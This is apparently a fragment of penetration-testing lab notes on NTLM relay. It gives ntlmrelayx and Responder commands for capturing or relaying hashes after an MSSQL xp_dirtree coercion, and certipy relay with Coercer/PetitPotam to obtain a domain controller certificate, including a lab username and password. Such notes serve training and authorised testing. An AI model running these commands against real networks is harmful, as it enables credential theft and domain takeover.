**Requires:** An applicable relay path in the lab; SMB signing, EPA, or channel binding can prevent relay.

## SMB relay listener

**Kali**

```bash
sudo impacket-ntlmrelayx -t smb://TARGET_IP -smb2support
```

Requires incoming authentication and a target that does not require SMB signing. Do not run a second SMB listener on the same port.

<Accordion title="When you don&#x27;t have sysadmin: steal the service account&#x27;s hash with xp_dirtree">

### When you don't have sysadmin: steal the service account's hash with xp_dirtree

**Microsoft SQL Server Enumeration**

```bash
# 1. On your box, listen for the inbound authentication
sudo responder -I tun0                 # capture the NetNTLM hash to crack offline
# (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
```

</Accordion>

<Accordion title="Step 1 — relay + coerce (the cert)">

### Step 1 — relay + coerce (the cert)

**Pass the Certificate: PKINIT and Lab Walkthrough**

```bash
# Terminal 1 — relay (certipy relay is sturdier than ntlmrelayx for ADCS retrieval)
certipy relay -target http://10.129.234.172 -template KerberosAuthentication -timeout 30

# Terminal 2 — coerce the DC (.174) ONCE; PetitPotam is the reliable method here
coercer coerce -u wwhite -p 'package5shores_topher1' -d inlanefreight.local \
  -t 10.129.234.174 -l <tun0-IP> --filter-method-name EfsRpcAddUsersToFile
```

</Accordion>
